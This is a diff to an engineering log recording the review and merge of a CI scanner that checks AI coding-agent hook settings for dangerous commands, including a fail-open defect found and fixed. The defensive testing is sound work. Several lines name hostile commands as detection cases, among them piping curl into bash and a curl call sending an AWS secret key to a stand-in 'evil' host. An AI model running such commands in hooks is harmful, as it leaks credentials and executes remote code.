@@ -1207,3 +1207,100 @@ skipped, in both target repos), the gate step on each real tree, `make check` an
 `hops-mcp`. Whether the AWOS re-run turns PRV-17 to PASS is unknown until the measurement checkpoint;
 the check is `method: "judgment"`, so its evidence field was targeted clause by clause rather than
 paraphrased, but a judgment check can still read the same text differently.
+
+---
+
+## 2026-08-26 — reviewing our own gate, and finding it had the defect it was built to fix
+
+**What was attempted.** A review pass over the three open pull requests from the W2.2 work —
+`hops` #556 (the agent-config scanner), `hops` #557 (the surface declaration and CODEOWNERS), and
+`hops-mcp` #56 (the ported scanner). All three were green and carried an approval. The question was
+whether the claims in their descriptions survive independent checking.
+
+**Method.** Every claim was re-derived rather than read. The scanner was run against the real `hops`
+tree from a copy outside the repo; the two copies of the 576-line checker were `diff`ed against each
+other; the self-test suite was run; CODEOWNERS was validated through
+`gh api repos/…/codeowners/errors?ref=<branch>`, which returned `{"errors":[]}` and thereby confirmed
+both the syntax and that `@provectus-barhopping/hops-engineers` resolves with access — an owner
+without repo access is silently ignored by GitHub, so a clean parse is the check that matters. The
+rule set was probed with fifteen hand-written commands, half of them evasions and half legitimate
+hook content, rather than trusting the calibration table in the PR body.
+
+**What came back.** The substance held. Four hooks found on the real tree, two referencing a script
+and two inline-only, two files scanned, zero blocking findings, one advisory — exactly as claimed.
+The negative controls stayed silent: the guard-reinstall hook and `npx eslint $(git diff …)` produce
+nothing, while `curl … | bash`, `npx -y`, `git config core.hooksPath` and `--no-verify` all fire.
+
+**The finding worth the review.** `scanRepo()` returns zero findings when `.claude/settings*.json` is
+absent, and `main()` exits 0 — verified by pointing it at an empty directory, which printed *"no
+agent hook surface in this repo — all clear"* and exited 0. **The gate written to correct a check
+that skipped and still reported 100% had the same defect in it.** A pull request deleting or renaming
+`.claude/settings.json` would have turned the job green. Fixed with `--require-surface`, which makes
+an absent settings file an ordinary blocking `missing-surface` Finding — so it flows through the
+allowlist, `--json` and the exit code like every other — and is passed by both workflow steps. The
+flag defaults off so that ad-hoc local scans of an unrelated directory still exit 0.
+
+**The second finding is the same shape one level up.** #557's CODEOWNERS routes review for
+`scripts/pre-commit` and `scripts/claude-hooks/` — the old guards — but not for
+`scripts/check-agent-config.mjs` or `.github/workflows/**`, which are the new one. `CLAUDE.md` named
+`.github/workflows/**` as no-drive-by in prose, and prose does not route a review request. **A
+control that protects the previous generation of controls but not itself.** Both paths added.
+
+Deliberately *not* added to the `paths:` frontmatter of `.claude/rules/agent-config-surface.md`:
+`.github/workflows/**`. Those rules would then load on every unrelated CI edit, and the PR's own
+thesis is that a noisy gate is one that gets ignored. CODEOWNERS routes the review; the rules file
+loads on the agent surface and on the scanner, not on all of CI.
+
+**Coverage gaps recorded, not fixed.** `curl http://evil/?k=$AWS_SECRET_ACCESS_KEY` produces zero
+findings — `credential-read` matches file paths only and `exfil-http` requires a data flag, so a GET
+with the secret in the query string, the most natural exfiltration from a hook, is missed.
+`source <(curl …)` slips past while `bash <(curl …)` is caught. `curl -X POST` blocks
+unconditionally, including to `localhost`. All three are follow-ups with tests attached; widening a
+rule without re-running the negative control on the real tree is how a gate starts firing on its own
+secret-guard.
+
+**What could not be verified.** Nothing is pushed, so no CI run exists for any of the three follow-up
+commits — the green results are local: 24 tests (22 pass, 2 SKIPPED for the absent fixture) in both
+repos, the gate step against each real tree, `npm test` (63 files, 1507 tests) and `make check` in
+`hops-mcp`. The CODEOWNERS re-parse after the new entries needs a push before
+`codeowners/errors?ref=` can be asked again; the added lines reuse an owner already validated and
+standard path syntax, which is weaker evidence than the API call. `hops-mcp` runs no CI job that
+invokes `vitest` at all, so its 1507 tests gate nothing and the "red on `main`" that #56 fixes was
+never a CI signal — worth its own work item.
+
+---
+
+## 2026-08-26 — both work items closed: merged, and re-measured on `main`
+
+**What was attempted.** Close W1.3 (PRV-17 — the agent-config surface declaration) and W2.2 (the
+hook-content scan) rather than leave them at "pushed, awaiting approval", and bring this repo's
+portable copy back in step with what actually shipped.
+
+**What came back.** All three pull requests are merged: `hops` #557 → `0be568719` (10:40Z),
+`hops-mcp` #56 → `c9449f8` (10:37Z), `hops` #556 → `8039e6939` (10:52Z), each approved with every
+check green. Both fixes the review pass produced are in the merged trees, verified on `origin/main`
+rather than on the branches: `--require-surface` is present in both copies of the scanner and passed
+by both workflow steps, and CODEOWNERS routes `scripts/check-agent-config.mjs*` and
+`.github/workflows/`. The gate re-run against each merged `main` reproduces the CI output exactly —
+`hops` 4 hooks / 2 files / 17 plugins / 1 advisory / exit 0, `hops-mcp` 2 inline hooks / 0 files /
+1 advisory / exit 0.
+
+**The method note worth keeping.** Closing an item meant re-deriving its claims from `origin/main`,
+not from the branch that was reviewed. Three things only that ordering could have caught: whether a
+squash merge carried the follow-up commits at all, whether CODEOWNERS still parses with the added
+lines, and that this repo's `tooling/ci/agent-config-scan/` was **two commits stale** — it held the
+pre-review scanner without `--require-surface`, so the "portable version" a second repo would have
+copied was the version with the fail-open defect in it. Re-synced from merged `main`; both files and
+both job templates are now byte-identical to what ships, 24/24 self-tests green here.
+
+**A GitHub quirk, recorded so it is not re-derived.** `GET /repos/{o}/{r}/codeowners/errors?ref=`
+returns 404 when `ref` is the default branch *name* and `{"errors":[]}` when the same commit is
+asked for by SHA. The earlier caveat — that the post-fix CODEOWNERS could not be re-validated — is
+now closed: `ref=8039e6939` parses clean.
+
+**What still could not be verified.** The gate has **not run on an unrelated pull request** in
+either repo — no `hops-mr-check.yml` run exists after the merge, and the runs on other branches
+earlier that day predate the job reaching `main`. Until one lands, "standing control" rests on the
+workflow file, not on a run. And `main` in both repos still requires zero passing status checks
+(`rules/branches/main` carries only `deletion`, `non_fast_forward`, `pull_request`), so both gates
+are advisory at merge time — the org-level recommendation, not a defect in the gate.
